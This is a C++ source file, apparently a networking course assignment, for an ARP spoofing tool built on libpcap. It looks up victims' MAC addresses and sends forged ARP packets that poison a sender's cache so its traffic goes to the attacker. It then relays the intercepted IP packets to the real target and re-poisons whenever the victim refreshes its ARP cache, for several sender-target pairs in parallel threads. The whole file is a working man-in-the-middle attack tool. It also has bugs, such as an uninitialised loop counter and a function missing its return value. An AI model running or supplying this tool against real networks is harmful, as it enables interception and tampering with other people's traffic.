#include <cstdio>
#include <pcap.h>
#include <unistd.h>
#include <string.h>
#include <pthread.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "getadds.h"

#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

#define MAX 100

typedef struct ip_pair{
	char s_ip[16];
	char t_ip[16];
}ip_pair;

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

char attacker_ip[80];
char attacker_mac[80];
char iface[80];
Mac a_mac;
Ip a_ip;

int get_s_mac(char* s_ip, char* s_mac){
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(iface, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", iface, errbuf);
		return -1;
	}

	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	packet.eth_.smac_ = a_mac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.eth_.smac_ = a_mac;
	packet.arp_.sip_ = htonl(a_ip);
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(Ip(s_ip));

	printf("sending normal ARP packet to victim...\n");
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	sleep(3); // because getting arp reply can take some time

	for(int i;i<1000;i++) {
        struct pcap_pkthdr *pkt_header;
        const u_char *pkt_data;
        int res = pcap_next_ex(handle, &pkt_header, &pkt_data);

        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

		EthArpPacket* arp_pkt = (EthArpPacket *)pkt_data;

        if(arp_pkt->eth_.type_ != htons(EthHdr::Arp))continue;
		if(arp_pkt->arp_.op_ != htons(ArpHdr::Reply))continue;
		if(memcmp(arp_pkt->eth_.dmac_.mac_, a_mac.mac_, 6)!=0)continue;
		if(Ip(s_ip).ip_ != htonl(arp_pkt->arp_.sip_.ip_))continue;

		uint8_t* mac_str = (uint8_t*)arp_pkt->arp_.smac_;
		sprintf(s_mac, "%02x:%02x:%02x:%02x:%02x:%02x", mac_str[0], mac_str[1], \
					mac_str[2], mac_str[3], mac_str[4], mac_str[5]);

		pcap_close(handle);

		return 0;
	}
	return -1;
}

int arp_inf_attack(char* s_ip, char* s_mac, char* t_ip){

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(iface, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", iface, errbuf);
		return -1;
	}
	
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac(s_mac);
	packet.eth_.smac_ = a_mac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.eth_.smac_ = a_mac;
	packet.arp_.sip_ = htonl(Ip(t_ip));
	packet.arp_.tmac_ = Mac(s_mac);
	packet.arp_.tip_ = htonl(Ip(s_ip));

	printf("sending attack ARP packet to victim...\n");
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	pcap_close(handle);
}

void* arp_spoof(void* ipp){
	char s_ip[20];
	char t_ip[20];
	strcpy(s_ip, ((ip_pair *)ipp)->s_ip);
	strcpy(t_ip, ((ip_pair *)ipp)->t_ip);

	char s_mac[80];
	char t_mac[80];
	get_s_mac(s_ip, s_mac);
	get_s_mac(t_ip, t_mac);
	arp_inf_attack(s_ip, s_mac, t_ip);
	printf("arp infection complete\n");
	printf("good\n");
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(iface, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", iface, errbuf);
		return 0;
	}

	while (true){
		struct pcap_pkthdr *pkt_header;
        const u_char *pkt_data;
        int res = pcap_next_ex(handle, &pkt_header, &pkt_data);

        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

		EthArpPacket* arp_pkt = (EthArpPacket *)pkt_data;
		
		if(arp_pkt->eth_.type_ == htons(EthHdr::Ip4) && memcmp(arp_pkt->eth_.dmac_.mac_, Mac(s_mac).mac_, 6)==0)
		{
			arp_pkt->eth_.dmac_ = Mac(t_mac);
			arp_pkt->eth_.smac_ = a_mac;
			int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(arp_pkt), pkt_header->caplen);
			if (res != 0){
				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			}
		}

		else if(arp_pkt->eth_.type_ == htons(EthHdr::Arp) \
			&& memcmp(arp_pkt->eth_.smac_.mac_, Mac(s_mac).mac_, 6)==0){
				arp_inf_attack(s_ip, s_mac, t_ip);
		}
	}
	pcap_close(handle);
}

int main(int argc, char* argv[]) {
	
	if (argc < 4 || argc%2==1) {
		usage();
		return -1;
	}

	int counter = argc/2-1;

	strcpy(iface, argv[1]);

	if(get_ip(attacker_ip, argv[1])!=0){
		printf("error getting ip!\n");
		return -1;
	}

	if(get_mac(attacker_mac, argv[1])!=0){
		printf("error getting mac!\n");
		return -1;
	}

	a_mac = Mac(attacker_mac);
	a_ip = Ip(attacker_ip);
	ip_pair p[counter];
	pthread_t threads[counter];
   	int rc;
	for(int i = 0; i < counter;i++){
		strcpy(p[i].s_ip, argv[2*i+2]);
		strcpy(p[i].t_ip, argv[2*i+3]);
		rc = pthread_create(&threads[i], NULL, arp_spoof, (void *)&p[i]);
      	if (rc) {
         	printf("Error:unable to create thread\n");
         	exit(-1);
      	}
	}
	pthread_exit(NULL);
}
